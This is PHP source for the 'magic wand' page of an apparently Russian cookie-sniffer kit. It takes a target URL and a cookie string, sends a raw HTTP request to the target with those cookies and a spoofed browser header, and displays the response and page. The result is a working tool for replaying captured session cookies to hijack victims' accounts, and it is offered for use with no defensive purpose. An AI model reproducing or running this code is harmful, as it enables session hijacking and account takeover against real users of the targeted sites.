<?
define("FILE", "wand.php");

require "config.php";
require "functions.php";

if ($auth_enabled) {
	$authorized = false;
	if (isset($_SERVER['PHP_AUTH_USER']) and isset($_SERVER['PHP_AUTH_PW'])) {
		if ($_SERVER['PHP_AUTH_USER'] == $user and $_SERVER['PHP_AUTH_PW'] == $password) $authorized = true;
	}
	if (!$authorized) {
		header("WWW-Authenticate: Basic realm=\"php Based Sniffer 4 Personal\"");
		header("HTTP/1.1 401 Unauthorized");
		die("В доступе отказано.");
	}
}

if (!$magic_wand) die("Функция &laquo;Волшебная палочка&raquo; отключена.");

if ($styles_enabled) {
	if ($_GET['style'] and file_exists("styles/".$_GET['style'].".css")) $style_filename = $_GET['style'].".css";
		elseif ($_COOKIE['s_style'] and file_exists("styles/".$_COOKIE['s_style'].".css")) $style_filename = $_COOKIE['s_style'].".css";
	$current_style = substr($style_filename, 0, strpos($style_filename, ".css"));
	setcookie("s_style", $current_style, time()+7776000);
}

$url = stripslashes(urldecode($_GET['url']));
$cookies = stripslashes(urldecode($_GET['cookies']));
$gzip = ($_GET['gzip'] == "on") ? "on" : NULL;
$http = ($_GET['http'] == "1.1") ? "1.1" : "1.0";

preg_match("/^https?:\/\/([^\/]+)/i", $url, $matches);
$host = $matches[1];

if (empty($host)) die("Указан неверный URL.");
if (!$fp = @fsockopen($host, 80)) die("Хост $host не найден.");

$url_enc = urlencode($url);
$cookies_enc = urlencode($cookies);
$path_http = "wand.php?url=$url_enc&cookies=$cookies_enc";
if ($gzip) $path_http .= "&gzip=$gzip";
$path_http .= "&http=1.1";
$path_gzip = "wand.php?url=$url_enc&cookies=$cookies_enc&gzip=on";
if ($http == "1.1") $path_gzip .= "&http=1.1";
$path_iframe = "page.php?url=$url_enc&cookies=$cookies_enc";
if ($gzip) $path_iframe .= "&gzip=$gzip";
if ($http == "1.1") $path_iframe .= "&http=1.1";

fputs($fp, "GET $url HTTP/$http\r\n".
"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/msword, application/vnd.ms-powerpoint, application/vnd.ms-excel, application/x-icq, */*\r\n".
"Accept-Language: ru\r\n".
"Accept-Encoding: deflate\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)\r\n".
"Host: $host\r\n".
"Connection: Keep-Alive\r\n".
"Cookie: $cookies\r\n\r\n");

$get = fgets($fp);
if ($get == "HTTP/1.0 400 Bad Request\r\n") header("Location: $path_http");
?>
<html>
<head>
<title>Сниффер - Волшебная палочка</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<link rel="stylesheet" type="text/css" href="styles/<?=$style_filename?>">
<style type="text/css">
table.margined {margin-top:4px;}
td.padded {padding:2px 0px 2px 0px;}
td.right-padded {padding:2px 5px 2px 0px; text-align:right;}
.input {font-size:12px;}
</style>
</head>

<body>
<p>Страница: <a href="<?=htmlspecialchars($url)?>" target="_blank"><?=htmlspecialchars($url)?></a><br>
Cookies: <?=htmlspecialchars($cookies)?></p>
<p>Ответ сервера:<br>
<blockquote style="margin:5px 0 0 8px; padding-left:4px; border-left:2px solid;">
<code>
<?
while (!feof($fp)) {
	$get .= fgets($fp);
	if (strpos($get, "\r\n\r\n") !== false) {
		$get = str_replace("\r\n\r\n", "\r\n", $get);
		break;
	}
}
echo nl2br($get);

fclose($fp);
?>
</code>
</blockquote>
</p>
<table width="100%">
<tr>
<td>
<form action="wand.php" method="get">
<table cellpadding="0" cellspacing="0" class="margined">
<tr>
<td class="right-padded">Страница:</td><td class="padded"><input type="text" name="url" value="<?=htmlspecialchars($url)?>" class="input" style="width:160px;"></td>
</tr><tr>
<td class="right-padded">Cookies:</td><td class="right-padded"><input type="text" name="cookies" value="<?=htmlspecialchars($cookies)?>" class="input" style="width:160px;"></td><td class="padded">&nbsp;<input type="image" src="img/wand.gif" width="17" height="16" alt="Взмахнуть палочкой">
</td>
</tr>
</table>
</form>
</td>
<td align="right" valign="bottom">
<? if (!$gzip) { ?><a href="<?=$path_gzip?>">нечитаемые символы?</a><? } ?>
</td>
</tr>
</table>
<iframe width="100%" height="100%" frameborder="1" src="<?=$path_iframe?>">
</iframe>
</body>
</html>